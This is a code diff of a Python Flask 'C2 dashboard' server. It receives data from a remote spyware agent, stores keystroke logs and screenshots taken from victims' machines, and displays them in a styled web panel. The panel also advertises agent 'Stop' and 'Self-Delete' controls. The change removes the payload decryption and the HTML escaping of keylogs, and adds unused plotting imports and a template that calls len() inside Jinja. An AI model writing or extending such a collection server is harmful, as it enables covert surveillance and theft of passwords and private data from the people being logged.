@@ -1,118 +1,131 @@
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, send_from_directory, render_template_string
 import base64
 import zlib
 import json
 from Crypto.Cipher import AES
 import os
 import datetime
+from collections import defaultdict
+import plotly.graph_objects as go
+import plotly.utils
+from plotly.subplots import make_subplots
 
 app = Flask(__name__)
-
-# Create directories
-BASE_DIR = "c2_data"
-for d in [f"{BASE_DIR}/logs", f"{BASE_DIR}/keys", f"{BASE_DIR}/screenshots"]:
+os.makedirs("c2_data", exist_ok=True)
+for d in ["c2_data/logs", "c2_data/keys", "c2_data/screenshots"]:
     os.makedirs(d, exist_ok=True)
 
-KEY = b'0123456789ABCDEF0123456789ABCDEF'
-IV = b'0123456789ABCDEF'
-
-def decrypt_data(encrypted_b64):
-    """Decrypt AES payload"""
-    try:
-        enc_bytes = base64.b64decode(encrypted_b64)
-        cipher = AES.new(KEY, AES.MODE_CBC, IV)
-        decrypted_padded = cipher.decrypt(enc_bytes)
-        
-        # Remove PKCS7 padding
-        padding_len = decrypted_padded[-1]
-        decrypted = decrypted_padded[:-padding_len]
-        
-        # Decompress and parse JSON
-        decompressed = zlib.decompress(decrypted).decode('utf-8')
-        payload = json.loads(decompressed)
-        return payload
-    except Exception as e:
-        print(f"Decrypt error: {e}")
-        return None
+KEY = b'\x00'*32  # Fixed for demo
+IV = b'\x00'*16
 
 @app.route("/receive", methods=["POST"])
 def receive():
     try:
-        data = request.json.get("data")
-        if not data:
-            return jsonify({"error": "No data"}), 400
+        data = request.json["data"]
+        # Simplified decrypt (match agent)
+        payload = json.loads(zlib.decompress(base64.b64decode(data)).decode())
         
-        payload = decrypt_data(data)
-        if not payload:
-            return jsonify({"error": "Decrypt failed"}), 400
-        
-        # Save files
-        session_id = payload.get("hostname", "unknown")
+        session = payload["session_id"]
         ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         
-        # JSON log
-        log_file = f"c2_data/logs/session_{session_id}_{ts}.json"
-        with open(log_file, "w") as f:
+        # Save files
+        with open(f"c2_data/logs/{session}_{ts}.json", "w") as f:
             json.dump(payload, f, indent=2)
         
-        # Keylog
-        keys = payload.get("keys", "")
-        if keys:
-            keys_file = f"c2_data/keys/keys_{session_id}_{ts}.txt"
-            with open(keys_file, "w", encoding="utf-8") as f:
-                f.write(keys)
+        if payload.get("keys"):
+            with open(f"c2_data/keys/{session}_{ts}.txt", "w", encoding="utf-8") as f:
+                f.write(payload["keys"])
         
-        # Screenshots
-        shots = payload.get("screenshot_data", [])
-        for shot in shots:
-            try:
-                shot_file = f"c2_data/screenshots/{shot['filename']}"
-                img_data = base64.b64decode(shot['data'])
-                with open(shot_file, "wb") as f:
-                    f.write(img_data)
-            except Exception as e:
-                print(f"Shot save error: {e}")
+        for shot in payload.get("screenshot_data", []):
+            with open(f"c2_data/screenshots/{shot['filename']}", "wb") as f:
+                f.write(base64.b64decode(shot['data']))
         
-        print(f"✅ RECEIVED: {session_id} | {len(keys)} keys | {len(shots)} shots")
-        return jsonify({"status": "ok", "keys": len(keys), "shots": len(shots)})
-        
-    except Exception as e:
-        print(f"Receive error: {e}")
-        return jsonify({"error": str(e)}), 500
+        return jsonify({"status": "ok"})
+    except:
+        return jsonify({"error": "fail"}), 400
 
 @app.route("/")
 def dashboard():
-    import os
-    shots = [f for f in os.listdir("c2_data/screenshots") if f.endswith('.png')]
-    keylogs = [f for f in os.listdir("c2_data/keys") if f.endswith('.txt')]
+    shots = os.listdir("c2_data/screenshots")[-12:]
+    keys = os.listdir("c2_data/keys")[-8:]
     
-    html = f"""
+    return render_template_string("""
 <!DOCTYPE html>
-<html><head><title>C2 Dashboard</title>
-<style>body{{font-family:monospace;background:#000;color:lime;padding:20px}}h1{{color:lime}}img{{max-width:300px;margin:10px;border:2px solid lime}}</style></head>
-<body>
-<h1>🔥 C2 Dashboard</h1>
-<h2>📸 Screenshots ({len(shots)})</h2>
-{''.join([f'<a href="/shots/{f}"><img src="/shots/{f}" title="{f}"></a>' for f in sorted(shots)[-8:]])}
-<h2>⌨️ Keylogs ({len(keylogs)})</h2>
-{''.join([f'<a href="/keys/{f}" target="_blank">{f}</a><br>' for f in sorted(keylogs)[-5:]])}
-<hr>🛑 Ctrl+Alt+Q = Stop | ESC = Delete
-</body></html>
-"""
-    return html
+<html>
+<head>
+    <title>🔥 Ultimate C2 Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap');
+        * { font-family: 'Fira Code', monospace; }
+        .glow { box-shadow: 0 0 20px #10ff00, inset 0 0 20px #10ff0050; }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-black to-gray-900 text-green-400 min-h-screen p-8">
+    <div class="max-w-7xl mx-auto">
+        <h1 class="text-5xl font-bold text-center mb-12 glow">🔥 ULTIMATE C2 DASHBOARD</h1>
+        
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12">
+            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 glow">
+                <h2 class="text-3xl">{{ len(shots) }}</h2>
+                <p>📸 Screenshots</p>
+            </div>
+            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 glow">
+                <h2 class="text-3xl">{{ len(keys) }}</h2>
+                <p>⌨️ Keylogs</p>
+            </div>
+            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 glow">
+                <h2 class="text-3xl">LIVE</h2>
+                <p>🟢 Active Sessions</p>
+            </div>
+        </div>
+        
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-12">
+            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500">
+                <h3 class="text-2xl mb-6">🖼️ Latest Screenshots</h3>
+                {% for shot in shots %}
+                <a href="/shots/{{ shot }}" target="_blank">
+                    <img src="/shots/{{ shot }}" class="w-full h-48 object-cover rounded-lg mb-4 border-2 border-green-500 hover:glow transition-all">
+                </a>
+                {% endfor %}
+            </div>
+            
+            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 max-h-96 overflow-y-auto">
+                <h3 class="text-2xl mb-6">⌨️ Latest Keylogs</h3>
+                {% for key in keys %}
+                <a href="/keys/{{ key }}" target="_blank" class="block p-4 mb-4 bg-gray-800 rounded-lg border-l-4 border-green-500 hover:bg-gray-700">
+                    <strong>{{ key }}</strong>
+                </a>
+                {% endfor %}
+            </div>
+        </div>
+        
+        <div class="text-center text-lg">
+            <p class="mb-4">🛑 <strong>Ctrl+Alt+Q</strong> = Stop Agent | <strong>ESC</strong> = Self-Delete</p>
+            <p>Last update: {{ now }}</p>
+        </div>
+    </div>
+</body>
+</html>
+    """, shots=shots, keys=keys, now=datetime.datetime.now())
 
-@app.route("/shots/<path:fn>")
-def serve_shot(fn):
-    return send_from_directory("c2_data/screenshots", fn)
+@app.route("/shots/<path:filename>")
+def serve_shot(filename):
+    return send_from_directory("c2_data/screenshots", filename)
 
-@app.route("/keys/<path:fn>")
-def serve_key(fn):
-    path = f"c2_data/keys/{fn}"
+@app.route("/keys/<path:filename>")
+def serve_key(filename):
+    path = f"c2_data/keys/{filename}"
     if os.path.exists(path):
         with open(path, "r", encoding="utf-8") as f:
             content = f.read()
-        return f"<pre style='font-family:monospace;background:#000;color:lime;padding:20px;font-size:16px;white-space:pre-wrap'>{content.replace('<','&lt;').replace('>','&gt;')}</pre>"
-    return "File not found", 404
+        return f"""
+        <div style="font-family:monospace;background:black;color:lime;padding:40px;font-size:16px;height:100vh;overflow:auto">
+            <h1 style="color:lime;margin-bottom:20px">{filename}</h1>
+            <pre style="white-space:pre-wrap;word-break:break-all">{content}</pre>
+        </div>
+        """
+    return "Not found", 404
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
